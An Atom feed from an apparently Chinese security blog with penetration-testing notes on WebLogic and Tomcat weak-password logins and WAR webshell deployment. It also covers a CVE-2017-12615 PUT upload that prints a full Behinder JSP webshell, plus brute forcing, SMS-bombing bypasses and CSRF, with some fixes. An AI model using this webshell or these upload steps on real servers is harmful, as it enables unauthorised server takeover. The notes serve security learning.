<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Erickin</title>
  
  
  <link href="https://erickinyae.github.io/atom.xml" rel="self"/>
  
  <link href="https://erickinyae.github.io/"/>
  <updated>2024-03-18T14:13:46.509Z</updated>
  <id>https://erickinyae.github.io/</id>
  
  <author>
    <name>Erickin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>weblogic漏洞</title>
    <link href="https://erickinyae.github.io/2024/03/18/weblogic%E6%BC%8F%E6%B4%9E/"/>
    <id>https://erickinyae.github.io/2024/03/18/weblogic%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-18T14:13:12.000Z</published>
    <updated>2024-03-18T14:13:46.509Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weblogic弱口令漏洞识别和分析"><a href="#Weblogic弱口令漏洞识别和分析" class="headerlink" title="Weblogic弱口令漏洞识别和分析"></a>Weblogic弱口令漏洞识别和分析</h1><ul><li>weblogic管理页面默认端口7001，访问目标网站&#x2F;console接口即可跳转到weblogic后台登录页面。通过弱口令可登录后台，Weblogic支持在后台部署war文件，可以直接将webshell部署到web目录下并获取服务器权限。</li></ul><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318212458585.png?lastModify=1710768988" alt="image-20240318212458585"></p><ul><li><p>Weblogic默认端口7001，可通过端口扫描探测目标端口情况，找到weblogic服务页面并进行弱口令登录尝试。常见的弱口令有tomcat&#x2F;tomcat，admin&#x2F;admin，admin&#x2F;123456，root&#x2F;root等。访问7001端口，若看到以下错误页面说明为weblogic。weblogic支持在后台部署war文件，可以直接将webshell部署到web目录下并获取服务器权限。</p><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318212842286.png?lastModify=1710768988" alt="image-20240318212842286"></p></li><li><p>通过弱口令进入后台。把111.jsp打包为zip压缩包后将后缀修改为war，找到部署&gt;安装&gt;上载文件，上传木马。</p><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318212955409.png?lastModify=1710768988" alt="image-20240318212955409"></p></li><li><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318213205237.png?lastModify=1710768988" alt="V"></p></li></ul><h1 id="CVE-2017-10271远程命令执行漏洞识别和分析"><a href="#CVE-2017-10271远程命令执行漏洞识别和分析" class="headerlink" title="CVE-2017-10271远程命令执行漏洞识别和分析"></a>CVE-2017-10271远程命令执行漏洞识别和分析</h1><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318213507671.png?lastModify=1710768988" alt="image-20240318213507671"></p><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318213556243.png?lastModify=1710768988" alt="image-20240318213556243"></p><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318213614686.png?lastModify=1710768988" alt="image-20240318213614686"></p><p><img src="file://D:/blog/blog/source/_posts/%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF/image-20240318213629663.png?lastModify=1710768988" alt="image-20240318213629663"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Weblogic弱口令漏洞识别和分析&quot;&gt;&lt;a href=&quot;#Weblogic弱口令漏洞识别和分析&quot; class=&quot;headerlink&quot; title=&quot;Weblogic弱口令漏洞识别和分析&quot;&gt;&lt;/a&gt;Weblogic弱口令漏洞识别和分析&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透" scheme="https://erickinyae.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>tomcat漏洞</title>
    <link href="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/"/>
    <id>https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-18T14:10:49.000Z</published>
    <updated>2024-03-18T14:12:47.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tomcat默认账号远程控制"><a href="#tomcat默认账号远程控制" class="headerlink" title="tomcat默认账号远程控制"></a>tomcat默认账号远程控制</h2><h3 id="1-资产扫描"><a href="#1-资产扫描" class="headerlink" title="1. 资产扫描"></a>1. 资产扫描</h3><p>确认该服务器使用的是tomcat，可通过nmap等资产测绘工具进行扫描；</p><h3 id="2-访问tomcat管理界面"><a href="#2-访问tomcat管理界面" class="headerlink" title="2.访问tomcat管理界面"></a>2.访问tomcat管理界面</h3><p>通过ip:8080端口访问tomcat默认管理界面；</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223611141.png" alt="image-20240317223611141"></p><p>点击Manager App进入管理界面进行登录；</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223708382.png" alt="image-20240317223708382"></p><p>默认用户密码tomcat、tomcat；</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223738893.png" alt="image-20240317223738893"></p><p>在war file deploy栏目中，进行war文件上传；</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223855995.png" alt="image-20240317223855995"></p><p>将behinder中的shell.jsp打包成war上传</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223942885.png" alt="image-20240317223942885"></p><p>上传后可以访问：</p><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224032661.png" alt="image-20240317224032661"></p><p>把下面的文件，用以下命令行启动，进入管理界面，然后就可以新增示例，进行远程命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224733968.png" alt="image-20240317224733968"></p><p>默认密码：rebeyond</p><h2 id="tomcat弱口令漏洞识别和分析"><a href="#tomcat弱口令漏洞识别和分析" class="headerlink" title="tomcat弱口令漏洞识别和分析"></a>tomcat弱口令漏洞识别和分析</h2><ul><li>Tomcat管理页面默认端口8080，点击登录未提示403错误说明服务未开启白名单限制，可以进行弱口令尝试。Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下并获取服务器权限。</li></ul><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318202402767.png?lastModify=1710768988" alt="image-20240318202402767"></p><ul><li><p>Tomcat管理页面默认端口8080，可通过端口扫描探测目标端口情况，找到tomcat页面并进行弱口令登录尝试。常见的弱口令有tomcat&#x2F;tomcat，admin&#x2F;admin，admin&#x2F;123456，root&#x2F;root等。Tomcat支持在后台部署war文件，通过弱口令登录可以直接将webshell部署到web目录下并获取服务器权限。</p></li><li><p>通过tomcat&#x2F;tomcat弱口令登录进行tomcat管理后台。把jsp木马打包为zip压缩包后将后缀修改为.war，上传war包并点击Deploy；</p><p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318202809843.png?lastModify=1710768988" alt="image-20240318202809843"></p></li><li><p>访问页面&#x2F;test&#x2F;test.jsp存在说明部署成功，使用蚁剑连接成功。</p></li></ul><h3 id="弱口令修复方法"><a href="#弱口令修复方法" class="headerlink" title="弱口令修复方法"></a>弱口令修复方法</h3><ul><li>编辑conf目录下的tomcat-users.xml文件，修改账号的密码为强度较高的强密码，如同时包含数字大小写字母且位数大于8位，不得使用一串相同的数字或字母组成，不能键盘连续序列集合；</li><li>Tomcat设置访问白名单，编辑文件&#x2F;webapps&#x2F;manager&#x2F;META-INF&#x2F;context.xml，修改为访问网段的地址或具体的IP；</li></ul><h2 id="CVE-2017-12615远程代码执行漏洞识别和分析"><a href="#CVE-2017-12615远程代码执行漏洞识别和分析" class="headerlink" title="CVE-2017-12615远程代码执行漏洞识别和分析"></a>CVE-2017-12615远程代码执行漏洞识别和分析</h2><ul><li><p>当tomcat运行在windows主机上，且启用了HTTP PUT请求方法（将readonly初始化参数由默认值设置为false），攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的jsp文件，之后，jsp文件中的代码将能被服务器执行。影响版本：Apache Tomcat 7.0.0 - 7.0.79。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;init-param&gt;</span><br></pre></td></tr></table></figure></li><li><p>Tomcat管理页面默认端口8080，可通过端口扫描探测目标端口情况，确认目标存在tomcat服务时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，以此获取目标服务器控制权限。利用条件：运行在windows主机上；启用HTTP PUT请求方法；Tomcat版本在7.0.0-7.0.79，使用::$DATA或%20绕过上传。</p></li><li><p>访问tomcat根目录抓包，修改为POST并手动修改为PUT请求，同时增加请求体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>使用&#x2F;绕过上传执行成功上传木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /test2.jsp/ HTTP/1.1</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 201</span><br></pre></td></tr></table></figure><p>即执行成功。</p><h3 id="CVE-2017-12615远程代码执行漏洞修复方法"><a href="#CVE-2017-12615远程代码执行漏洞修复方法" class="headerlink" title="CVE-2017-12615远程代码执行漏洞修复方法"></a>CVE-2017-12615远程代码执行漏洞修复方法</h3></li><li><p>除了升级tomcat版本外还可以将conf&#x2F;web.xml文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数，确保readonly设置为true，即不允许DELETE和PUT操作。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;tomcat默认账号远程控制&quot;&gt;&lt;a href=&quot;#tomcat默认账号远程控制&quot; class=&quot;headerlink&quot; title=&quot;tomcat默认账号远程控制&quot;&gt;&lt;/a&gt;tomcat默认账号远程控制&lt;/h2&gt;&lt;h3 id=&quot;1-资产扫描&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透" scheme="https://erickinyae.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>tomcat默认账号远程控制</title>
    <link href="https://erickinyae.github.io/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
    <id>https://erickinyae.github.io/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/</id>
    <published>2024-03-17T13:57:33.000Z</published>
    <updated>2024-03-18T13:06:12.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tomcat默认账号远程控制"><a href="#tomcat默认账号远程控制" class="headerlink" title="tomcat默认账号远程控制"></a>tomcat默认账号远程控制</h1><h2 id="1-资产扫描"><a href="#1-资产扫描" class="headerlink" title="1. 资产扫描"></a>1. 资产扫描</h2><p>确认该服务器使用的是tomcat，可通过nmap等资产测绘工具进行扫描；</p><h2 id="2-访问tomcat管理界面"><a href="#2-访问tomcat管理界面" class="headerlink" title="2.访问tomcat管理界面"></a>2.访问tomcat管理界面</h2><p>通过ip:8080端口访问tomcat默认管理界面；</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317223611141.png" alt="image-20240317223611141"></p><p>点击Manager App进入管理界面进行登录；</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317223708382.png" alt="image-20240317223708382"></p><p>默认用户密码tomcat、tomcat；</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317223738893.png" alt="image-20240317223738893"></p><p>在war file deploy栏目中，进行war文件上传；</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317223855995.png" alt="image-20240317223855995"></p><p>将behinder中的shell.jsp打包成war上传</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317223942885.png" alt="image-20240317223942885"></p><p>上传后可以访问：</p><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317224032661.png" alt="image-20240317224032661"></p><p>把下面的文件，用以下命令行启动，进入管理界面，然后就可以新增示例，进行远程命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/image-20240317224733968.png" alt="image-20240317224733968"></p><p>默认密码：rebeyond</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tomcat默认账号远程控制&quot;&gt;&lt;a href=&quot;#tomcat默认账号远程控制&quot; class=&quot;headerlink&quot; title=&quot;tomcat默认账号远程控制&quot;&gt;&lt;/a&gt;tomcat默认账号远程控制&lt;/h1&gt;&lt;h2 id=&quot;1-资产扫描&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透" scheme="https://erickinyae.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>php</title>
    <link href="https://erickinyae.github.io/2024/03/10/php/"/>
    <id>https://erickinyae.github.io/2024/03/10/php/</id>
    <published>2024-03-09T23:17:38.000Z</published>
    <updated>2024-03-10T13:20:48.087Z</updated>
    
    
    
    
    <category term="开发" scheme="https://erickinyae.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="语言" scheme="https://erickinyae.github.io/tags/%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite使用</title>
    <link href="https://erickinyae.github.io/2024/03/06/burpsuite%E4%BD%BF%E7%94%A8/"/>
    <id>https://erickinyae.github.io/2024/03/06/burpsuite%E4%BD%BF%E7%94%A8/</id>
    <published>2024-03-06T10:46:22.000Z</published>
    <updated>2024-03-06T11:07:39.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><h2 id="获取目标服务端响应"><a href="#获取目标服务端响应" class="headerlink" title="获取目标服务端响应"></a>获取目标服务端响应</h2><p>BurpSuite中如果需要在bp中获取服务端响应，并将其返回给浏览器，需要进行如下步骤：</p><p>在Proxy -&gt; Intercept界面下，在捕捉到的消息包中右键Do Intercept -&gt; Response to this request，返回一个响应包；</p><h2 id="Burpsuite-VPN-真实IP泄漏"><a href="#Burpsuite-VPN-真实IP泄漏" class="headerlink" title="Burpsuite + VPN 真实IP泄漏"></a>Burpsuite + VPN 真实IP泄漏</h2><p>注意，开启Burpsuite + VPN的使用方式可能会导致真实IP的泄漏。</p><p>原因：</p><p>数据流：Data -&gt; Brower -&gt; BurpSuite -&gt; Web服务端 -&gt; BurpSuite -&gt; Brower</p><p>在这个过程中，Brower是受到vpn代理的，但是BurpSuite没有，就会导致数据经由BurpSuite使用真实ip发送请求给Web服务端，从而导致泄漏。</p><h1 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h1><h2 id="弱密码爆破方法"><a href="#弱密码爆破方法" class="headerlink" title="弱密码爆破方法"></a>弱密码爆破方法</h2><ul><li><p>在proxy中右键send to intruder</p></li><li><p>在intruder中的target中确定爆破的地址和端口</p></li><li><p>在positions中确定爆破输入的位置</p></li><li><p>在payloads中：</p><ul><li><p>payload options[simple list]位置输入密码爆破载荷集；</p></li><li><p>在payload processing中选择载荷集的加密方式，即载荷被加密后再发送到服务器进行爆破；</p></li><li><p>payload encoding中取消勾选，从而取消转义。</p></li></ul></li></ul><p><img src="/2024/03/06/burpsuite%E4%BD%BF%E7%94%A8/image-20240306190735333.png" alt="image-20240306190735333"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Proxy&quot;&gt;&lt;a href=&quot;#Proxy&quot; class=&quot;headerlink&quot; title=&quot;Proxy&quot;&gt;&lt;/a&gt;Proxy&lt;/h1&gt;&lt;h2 id=&quot;获取目标服务端响应&quot;&gt;&lt;a href=&quot;#获取目标服务端响应&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="工具" scheme="https://erickinyae.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞利用</title>
    <link href="https://erickinyae.github.io/2024/03/06/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://erickinyae.github.io/2024/03/06/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-03-06T10:12:30.000Z</published>
    <updated>2024-03-06T10:45:36.691Z</updated>
    
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://erickinyae.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞类型</title>
    <link href="https://erickinyae.github.io/2024/03/06/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/"/>
    <id>https://erickinyae.github.io/2024/03/06/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</id>
    <published>2024-03-06T10:12:23.000Z</published>
    <updated>2024-03-14T12:15:20.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="越权漏洞-cookie越权漏洞"><a href="#越权漏洞-cookie越权漏洞" class="headerlink" title="越权漏洞 &amp; cookie越权漏洞"></a>越权漏洞 &amp; cookie越权漏洞</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>平行越权漏洞：同等级之下的越权操作；<br>垂直越权漏洞：由下而上的越权操作；</p><h2 id="网站权限的划分"><a href="#网站权限的划分" class="headerlink" title="网站权限的划分"></a>网站权限的划分</h2><p>管理员、会员、来宾</p><p>平行越权：会员 &lt;-&gt; 会员</p><p>垂直越权：会员 &lt;-&gt; 管理员</p><h2 id="常见ID分类"><a href="#常见ID分类" class="headerlink" title="常见ID分类"></a>常见ID分类</h2><p>自增id：1、2、3、4、5、6</p><p>编码id：base64编码</p><p>加密id：MD5、AES、SHA1等</p><p>可逆id：202403041528</p><h1 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h1><p>漏洞类型：常规弱口令、默认弱口令</p><p>实践中的问题：</p><p>验证码校验无法爆破：</p><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><ol><li>在提交信息完毕后是否及时销毁掉session中的验证码；</li><li>通过验证码识别软件或者某些burpsuite插件去绕过；</li></ol><h2 id="密码错误次数限制"><a href="#密码错误次数限制" class="headerlink" title="密码错误次数限制"></a>密码错误次数限制</h2><ol><li>数据库维护错误次数字段；</li><li>session失效或过期；</li></ol><h3 id="密码进行了某种加密算法"><a href="#密码进行了某种加密算法" class="headerlink" title="密码进行了某种加密算法"></a>密码进行了某种加密算法</h3><p>在前端代码中找到字段加密的方法：</p><p> 具体措施：</p><ol><li>在请求包中找到被加密字段的字段名；</li><li>在前端代码中搜索该字段名，找到对应的加密方法；</li><li>通过搜索或其他方式确定加密的类型。</li></ol><p>burp操作方法：</p><ul><li><p>在proxy中右键send to intruder</p></li><li><p>在intruder中的target中确定爆破的地址和端口</p></li><li><p>在positions中确定爆破输入的位置</p></li><li><p>在payloads中：</p><ul><li><p>payload options[simple list]位置输入密码爆破载荷集；</p></li><li><p>在payload processing中选择载荷集的加密方式，即载荷被加密后再发送到服务器进行爆破；</p></li><li><p>payload encoding中取消勾选，从而取消转义。</p></li></ul></li></ul><blockquote><p>Java的token验证操作是怎么做的？</p><p>待学习！</p></blockquote><h1 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>从正确的网站跳转到钓鱼网站</p><h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><ol><li>无需登录跳转</li><li>需登录跳转</li></ol><p>跳转形式分类：</p><ol><li><p>Header重定向</p><p>服务器没有验证<code>Location</code>字段的来源，或没有检查<code>params</code>部分是否包含恶意参数。如果<code>attacker.example.com</code>是一个恶意域名，且<code>evil-page</code>接收了恶意参数，那么这可能导致跨站请求伪造（CSRF）攻击，或者服务器执行恶意操作。</p></li><li><p>Js跳转</p><p>通过将输入的URL插入到js代码中进行跳转；</p></li><li><p>HTML跳转</p><p>通过将输入的URL插入到HTML代码中进行跳转；</p></li></ol><h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>为了防止这样的漏洞，服务器应该确保：</p><ul><li><code>Location</code>头的值是可信的，通常来源于服务器内部或者用户的合法请求。</li><li>对URL参数进行适当的验证和清理，防止注入攻击。</li><li>使用安全的HTTP方法（如GET而非POST）来执行某些敏感操作。</li></ul><p>在实际的Spring Boot应用中，使用Spring MVC的<code>RedirectView</code>或者<code>RedirectAttributes</code>可以帮助你更安全地实现重定向。同时，Spring Security也提供了安全的重定向处理。</p><h1 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h1><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>​定向轰炸：针对单个手机号进行批量式发送短信</p><p>​横向轰炸：不能对单个手机号造成影响，但可以浪费企业的资产</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li><p>空格、换行符(%0A)绕过</p><ul><li>每向短信接口发送一次请求时，都加上一个空格，这样就可以让该字段在数据库中查不到，从而不断地发送新的请求；</li></ul></li><li><p>数组绕过</p><ul><li><p>也要看短信运行商具体的过滤方式；</p><p><img src="/2024/03/06/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-20240310212744829.png" alt="image-20240310212744829"></p></li></ul></li></ul><h1 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h1><h2 id="发现的位置"><a href="#发现的位置" class="headerlink" title="发现的位置"></a>发现的位置</h2><p>文件下载、访问文件、图片等位置，通过抓包这些请求，往往可以找到一些路径。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>源码泄漏</li><li>数据库链接信息泄漏</li></ul><blockquote><p>对于java的程序而言，一般一个网站的程序以一个jar包的打包和启动，一般这个程序都是以root权限启动，可以在&#x2F;root&#x2F;.bash_history找到历史命令执行记录，读取后找到jar启动的记录，通过直接访问将其下载下来，从而将源码整个下载下来。</p></blockquote><h1 id="CSRF漏洞（跨站请求伪造）"><a href="#CSRF漏洞（跨站请求伪造）" class="headerlink" title="CSRF漏洞（跨站请求伪造）"></a>CSRF漏洞（跨站请求伪造）</h1><h2 id="漏洞类型-1"><a href="#漏洞类型-1" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><ul><li>写入型</li><li>读取型</li></ul><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ol><li>用户必须处于登录状态</li><li>必须知道后端接收的参数名称<ol><li>会员前台</li><li>开源CMS</li></ol></li></ol><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>抓到包后，通过伪造链接发送请求，可以通过get、post的方式。</p><p>同样发送请求的方式也有多种，可以提供一个button给被攻击者点击，也可以通过js脚本自动执行。</p><p>还可以利用html的特性，html会对script src和link src两种链接自动发起请求，在这些链接中注入需要跨站请求的链接，从而使html自动触发执行。</p><blockquote><p>POST请求怎么隐藏？</p><p>第一步：伪造界面，利用iframe构造两个页面，其中第一个是用作隐藏和欺骗的，第二个才是真正做请求的事情；</p><p><img src="/2024/03/06/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-20240310221404865.png" alt="image-20240310221404865"></p><p>第二步：在csrf.html中构造发送POST请求的脚本，通过js自动化提交POST请求，需要自己实现，下面的案例没有实现自动化提交的功能。</p><p><img src="/2024/03/06/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-20240310221525177.png" alt="image-20240310221525177"></p></blockquote><h2 id="攻击特征"><a href="#攻击特征" class="headerlink" title="攻击特征"></a>攻击特征</h2><p>POST类型CSRF攻击以及GET类型都无来源；</p><p>POST或者GET形式CSRF的referer来源地址都不是被请求后端域名；</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul><li>token修复<ul><li>即在涉及到提交、修改等操作的位置，验证一次token信息；</li></ul></li><li>refer验证<ul><li>如果refer是空的，或者根本没有refer，或者refer和host对不上，则认为是一次csrf攻击；</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;越权漏洞-cookie越权漏洞&quot;&gt;&lt;a href=&quot;#越权漏洞-cookie越权漏洞&quot; class=&quot;headerlink&quot; title=&quot;越权漏洞 &amp;amp; cookie越权漏洞&quot;&gt;&lt;/a&gt;越权漏洞 &amp;amp; cookie越权漏洞&lt;/h1&gt;&lt;h2 id=&quot;分</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://erickinyae.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>红军技术基础和资源</title>
    <link href="https://erickinyae.github.io/2024/03/06/%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80%E4%B8%8E%E8%B5%84%E6%BA%90/"/>
    <id>https://erickinyae.github.io/2024/03/06/%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80%E4%B8%8E%E8%B5%84%E6%BA%90/</id>
    <published>2024-03-06T10:12:23.000Z</published>
    <updated>2024-03-18T14:10:33.567Z</updated>
    
